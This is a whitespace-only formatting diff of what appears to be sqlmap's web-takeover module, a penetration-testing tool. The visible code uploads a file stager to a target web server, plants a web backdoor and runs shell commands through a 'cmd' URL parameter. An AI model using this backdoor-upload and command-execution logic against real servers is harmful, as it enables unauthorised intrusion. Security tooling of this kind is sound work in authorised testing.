@@ -46,11 +46,11 @@ class Web:
     """
 
     def __init__(self):
-        self.webApi         = None
-        self.webBaseUrl     = None
+        self.webApi = None
+        self.webBaseUrl = None
         self.webBackdoorUrl = None
-        self.webStagerUrl   = None
-        self.webDirectory   = None
+        self.webStagerUrl = None
+        self.webDirectory = None
 
     def webBackdoorRunCmd(self, cmd):
         if self.webBackdoorUrl is None:
@@ -61,7 +61,7 @@ class Web:
         if not cmd:
             cmd = conf.osCmd
 
-        cmdUrl  = "%s?cmd=%s" % (self.webBackdoorUrl, cmd)
+        cmdUrl = "%s?cmd=%s" % (self.webBackdoorUrl, cmd)
         page, _ = Request.getPage(url=cmdUrl, direct=True, silent=True)
 
         if page is not None:
@@ -96,7 +96,7 @@ class Web:
             page = Request.getPage(url=self.webStagerUrl, multipart=multipartParams, raise404=False)
 
             if "File uploaded" not in page:
-                warnMsg  = "unable to upload the backdoor through "
+                warnMsg = "unable to upload the backdoor through "
                 warnMsg += "the file stager on '%s'" % directory
                 logger.warn(warnMsg)
                 return False
@@ -176,7 +176,7 @@ class Web:
                 self.webApi = choices[int(choice) - 1]
                 break
 
-        kb.docRoot  = getDocRoot()
+        kb.docRoot = getDocRoot()
         directories = getDirs()
         directories = list(directories)
         directories.sort()
@@ -238,18 +238,18 @@ class Web:
                 self.webBaseUrl = "%s://%s:%d%s" % (conf.scheme, conf.hostname, conf.port, uriPath)
                 self.webStagerUrl = "%s/%s" % (self.webBaseUrl.rstrip('/'), stagerName)
 
-                uplPage, _  = Request.getPage(url=self.webStagerUrl, direct=True, raise404=False)
+                uplPage, _ = Request.getPage(url=self.webStagerUrl, direct=True, raise404=False)
 
                 if "sqlmap file uploader" not in uplPage:
                     if localPath not in warned:
-                        warnMsg  = "unable to upload the file stager "
+                        warnMsg = "unable to upload the file stager "
                         warnMsg += "on '%s'" % localPath
                         logger.warn(warnMsg)
                         warned.add(localPath)
                     continue
 
                 elif "<%" in uplPage or "<?" in uplPage:
-                    warnMsg  = "file stager uploaded "
+                    warnMsg = "file stager uploaded "
                     warnMsg += "on '%s' but not dynamically interpreted" % localPath
                     logger.warn(warnMsg)
                     continue
@@ -258,7 +258,7 @@ class Web:
                     kb.data.__EVENTVALIDATION = extractRegexResult(r"__EVENTVALIDATION[^>]+value=\"(?P<result>[^\"]+)\"", uplPage, re.I)
                     kb.data.__VIEWSTATE = extractRegexResult(r"__VIEWSTATE[^>]+value=\"(?P<result>[^\"]+)\"", uplPage, re.I)
 
-                infoMsg  = "the file stager has been successfully uploaded "
+                infoMsg = "the file stager has been successfully uploaded "
                 infoMsg += "on '%s' ('%s')" % (localPath, self.webStagerUrl)
                 logger.info(infoMsg)
 
@@ -287,12 +287,12 @@ class Web:
 
                 else:
                     if not self.__webFileStreamUpload(backdoorStream, backdoorName, posixToNtSlashes(localPath) if Backend.isOs(OS.WINDOWS) else localPath):
-                        warnMsg  = "backdoor has not been successfully uploaded "
+                        warnMsg = "backdoor has not been successfully uploaded "
                         warnMsg += "with file stager probably because of "
                         warnMsg += "lack of write permission."
                         logger.warn(warnMsg)
 
-                        message  = "do you want to try the same method used "
+                        message = "do you want to try the same method used "
                         message += "for the file stager? [y/N] "
                         getOutput = readInput(message, default="N")
 
@@ -304,7 +304,7 @@ class Web:
                     self.webBackdoorUrl = "%s/%s" % (self.webBaseUrl, backdoorName)
                     self.webDirectory = localPath
 
-                infoMsg  = "the backdoor has probably been successfully "
+                infoMsg = "the backdoor has probably been successfully "
                 infoMsg += "uploaded on '%s', go with your browser " % self.webDirectory
                 infoMsg += "to '%s' and enjoy it!" % self.webBackdoorUrl
                 logger.info(infoMsg)
